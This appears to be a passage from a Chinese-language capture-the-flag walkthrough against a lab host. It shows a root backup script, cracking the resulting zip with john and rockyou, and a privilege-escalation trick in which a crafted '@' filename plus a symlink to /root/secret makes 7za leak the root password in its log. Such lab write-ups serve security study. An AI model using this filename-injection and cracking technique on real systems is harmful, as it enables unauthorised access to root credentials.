结合上面的脚本backup.zip中的内容应当有password

```
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

可以理解为将upload上传的内容进行打包压缩，并使用password变量信息进行加密，所以我们获得相应的backup文件，我们可以使用john工具进行解密

我们将相应文件复制到uploads目录，通过web进行下载

```
http://192.168.231.229/uploads/backup.zip
```

```
zip2john backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

但破解失败，我们回过偷看backup.log文件记录了所有的打包过程

-rw-r--r-- 1 www-data www-data    0 Aug 12  2021 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 Aug 12  2021 enox.zip -> /root/secret

这两个，前者是一个空文件，后者是一个符号链接，7za在打包过程中因为符号链接不是要打包的内容，所以会返回异常，同时抛出密码

![image-20241130215040653](https://s2.loli.net/2024/11/30/PdKvNc5hH9Aal1C.png)
